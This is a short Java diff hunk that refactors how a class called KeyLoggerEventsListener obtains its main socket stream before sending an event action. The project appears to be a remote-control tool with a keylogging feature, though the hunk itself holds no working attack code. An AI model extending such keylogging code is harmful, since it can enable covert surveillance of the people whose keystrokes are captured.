@@ -19,7 +19,7 @@ public class KeyLoggerEventsListener implements ActionListener {
 
     @Override
     public void actionPerformed(ActionEvent e) {
-        Streams stream = Objects.requireNonNull(GetSYS.getClientHandler()).getMainStream();
+        Streams stream = Objects.requireNonNull(GetSYS.getStream(SocketType.MAIN));
         stream.getExecutor().submit(() -> {
             try {
                 stream.sendAction(event);
